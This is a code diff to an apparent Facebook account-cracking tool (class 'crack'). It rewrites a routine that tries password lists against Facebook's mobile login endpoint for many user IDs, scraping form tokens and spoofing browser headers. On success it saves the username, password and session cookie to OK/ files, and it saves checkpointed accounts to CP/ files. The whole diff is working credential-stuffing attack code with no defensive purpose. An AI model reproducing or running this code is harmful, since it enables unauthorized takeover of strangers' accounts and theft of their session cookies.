@@ -543,76 +543,79 @@ class crack:
 		self.hasil(ok,cp)
 	
 	#--- methode
-	def Crackers(self, user, peweh, url_log):
-		try:
-			global sukses,check,lopev
-			prog.update(des,description=f'{Te}{P}async {H}[OK{M}:{H}{len(sukses)}]{O}-{K}[CP{M}:{K}{len(check)}] {O}{str(lopev)}{P}/{O}{len(self.id)}')
-			prog.advance(des)
-			for xyz_ in peweh:
-				pw = xyz_.lower()
+	def __romz__(self, user, peweh, url_log):
+		global ok,cp,loop 
+		komtol=random.choice([f"{M}",f"{K}",f"{H}",f"{N}",f"{U}",f"{P}"])
+		print (f"\r- {komtol}• {P}{str(loop)}/{len(self.id)} - {H}OK:-{len(ok)} {K}CP:-{len(cp)}   ",end="")
+		for pw in peweh:
+			try: 
 				ses = requests.Session()
-				uas = open('ugent.txt','r').read()
-				#ses.headers.update({"Host": f"{url_log}","upgrade-insecure-requests": "1","user-agent": uas,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "XMLHttpRequest", "sec-fetch-site": "none", "sec-fetch-mode": "navigate", "sec-fetch-user": "?1", "sec-fetch-dest": "document", "accept-encoding": "gzip, deflate", "accept-language":  "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-				ling = ses.get(f'https://{url_log}/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text 
+				headex={"Host":url_log,"upgrade-insecure-requests":"1","user-agent":self.UA(),"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":f"https://{url_log}/","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+				ling = ses.get(f'https://{url_log}/login.php?',headers=headex).text 
+				times = int(datetime.now().timestamp())
 				dataa ={
 					'lsd':re.search('name="lsd" value="(.*?)"', str(ling)).group(1),
 					'jazoest':re.search('name="jazoest" value="(.*?)"', str(ling)).group(1),
 					'm_ts': re.search('name="m_ts" value="(.*?)"',str(ling)).group(1),
 					'li': re.search('name="li" value="(.*?)"',str(ling)).group(1),
-					'try_number': re.search('name="try_number" value="(.*?)"',str(ling)).group(1),
-					'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"',str(ling)).group(1),
-					"email":user,"pass":pw,
-					'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 
+					'try_number': '0',
+					'unrecognized_tries': '0',
+					'email':user,
+					#'pass':pw,
+					'encpass': '#PWD_BROWSER:0:{}:{}'.format(times, pw),
+					'prefill_contact_point':user,
+					'prefill_source': 'browser_dropdown', 
+					'prefill_type': 'contact_point', 
+					'first_prefill_source': 'browser_dropdown', 
+					'first_prefill_type': 'contact_point', 
+					'had_cp_prefilled':'true', 
+					'had_password_prefilled':'true', 
+					'is_smart_lock':'false', 
 					'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(ling)).group(1),
-					'_fb_noscript': re.search('name="_fb_noscript" value="(.*?)"',str(ling)).group(1)
-				}
-				sooz ={
+					'_fb_noscript': re.search('name="_fb_noscript" value="(.*?)"',str(ling)).group(1),
+					#'m_sess': '',
+					#'__dyn': '',
+					#'__csr': '',
+					#'__req': random.choice(['1','2','3','4','5']), # 'd',
+					#'__a': '',
+					#'__user': '0'
+					}
+				heades={
 					'Host': url_log,
 					'content-length': f"{len(str(dataa))}",
 					'x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(ling)).group(1),
-					'user-agent': uas,
+					'user-agent': self.UA(),
 					'content-type': 'application/x-www-form-urlencoded',
 					'accept': '*/*', 
 					'origin': 'https://'+url_log,
-					'x-requested-with': 'XMLHttpRequest',
 					'sec-fetch-site': 'same-origin',
 					'sec-fetch-mode': 'cors',
 					'sec-fetch-dest': 'empty', 
-					'referer': f'https://{url_log}/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
-					'accept-encoding': 'gzip, deflate',
-					'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
+					'referer': f'https://{url_log}/login.php?',
+					'accept-encoding': 'gzip, deflate, br',
+					'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
+					'cookie': (";").join([key+"="+value for key, value in ses.cookies.get_dict().items()])
 				}
-				cook = ses.cookies.get_dict()
-				po = ses.post(f"https://{url_log}/login/device-based/login/async/?refsrc=deprecated&lwv&100",data=dataa,headers=sooz,cookies=cook,allow_redirects = False)
-				if 'c_user' in ses.cookies.get_dict():
-					romz = ses.cookies.get_dict()
-					kukis = ";".join([key+"="+value for key, value in romz.items()])
-					tree = Tree(" ")
-					tree.add(f"{Te}{H}{user} ◊ {pw}")
-					tree.add(f"{Te}{H}{kukis}")
-					tree.add(f"{Te}{H}{uas}")
-					tulis(tree)
-					self.cek_apk(kukis)
-					os.popen("play-audio data/dapet.mp3")
-					sukses.append(f"{user} ◊ {pw} ◊ {kukis}")
-					open(f'OK/{waktu}.txt', 'a').write(f" *--> {user} ◊ {pw} ◊ {kukis}\n")
+				po = ses.post(f'https://{url_log}/login/device-based/login/async/?refsrc=deprecated&lwv=100', data=dataa, headers=heades, allow_redirects=False)
+				if 'c_user' in ses.cookies.get_dict().keys():
+					kukis = (";").join([key+"="+value for key, value in ses.cookies.get_dict().items()])
+					print(f'\r{P}└──{H} {user} ◊ {pw} \n{P} └─ {H}{kukis} \n{P} └─ {U}{self.UA()} \n ')
+					info = f"{user} ◊ {pw} ◊ {kukis}"
+					ok.append(f"{info}")
+					open(f'OK/{waktu}.txt', 'a').write(f" *--> {info}\n")
 					break
-				elif 'checkpoint' in ses.cookies.get_dict():
-					tree = Tree(" ")
-					tree.add(f"{Te}{K}{user} ◊ {pw}")
-					tree.add(f"{Te}{K}{uas}")
-					tulis(tree)
-					os.popen("play-audio data/dapet.mp3")
-					check.append(f'{user} ◊ {pw}')
-					open(f'CP/{waktu}.txt', 'a').write(f" *--> {user} ◊ {pw}\n")
+				elif 'checkpoint' in ses.cookies.get_dict().keys():
+					print (f'\r{P}└── {K}{user} ◊ {pw}  \n{P} └─ {U}{self.UA()} \n ')
+					info = f'{user} ◊ {pw}'
+					cp.append(f'{info}')
+					open(f'CP/{waktu}.txt', 'a').write(f" *--> {info}\n")
 					break
 				else:
 					continue
-					
-			lopev +=1
-		except requests.exceptions.ConnectionError:
-			time.sleep(6)
-			self.Crackers(user, peweh, url_log)
+			except requests.exceptions.ConnectionError:
+				time.sleep(3)
+			
+		loop+=1
 
 	# FINISH
 	def hasil(self,ok,cp):
